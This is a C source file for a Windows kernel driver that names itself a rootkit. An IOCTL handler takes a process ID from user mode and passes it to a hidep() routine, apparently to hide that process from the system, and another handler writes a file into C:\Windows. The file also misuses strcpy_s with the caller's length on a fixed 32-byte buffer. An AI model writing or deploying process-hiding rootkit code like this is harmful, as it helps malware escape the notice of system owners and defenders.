#include "Driver.h"

NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {

	

	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_SUCCESS;
	/////////////////////// THIS SECTION /////////////////////////////////////
	UNICODE_STRING     uniName;
	OBJECT_ATTRIBUTES  objAttr;
	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
	RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\Windows\\NOTCOOL.txt");  // or L"\\SystemRoot\\example.txt"
	InitializeObjectAttributes(&objAttr, &uniName,
		OBJ_CASE_INSENSITIVE,
		NULL, NULL);
	//////////////////////////////////

	///////////////////////////////////
	//Load the buffer (ie. contents of text file to the console)
	HANDLE handle;
	IO_STATUS_BLOCK    ioStatusBlock;
	ntstatus = ZwCreateFile(&handle,
		FILE_WRITE_DATA,
		&objAttr, &ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		FILE_NON_DIRECTORY_FILE,
		NULL, 0);


	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;

	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);


	return STATUS_SUCCESS;
}

NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {


	UNREFERENCED_PARAMETER(DeviceObject);

	
	ULONG inBufferLength, outBufferLength, requestCode;

	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	requestCode = irpSp->Parameters.DeviceIoControl.IoControlCode;

	PCHAR inBuf = Irp->AssociatedIrp.SystemBuffer;

	if (requestCode != IRP_ROOTKIT_CODE) {
		Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		return Irp->IoStatus.Status;
	}

	


	Irp->IoStatus.Information = inBufferLength;

	char pid[32];
	strcpy_s(pid, inBufferLength, inBuf);

	 
	hidep(atoi(pid));

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return Irp->IoStatus.Status;
}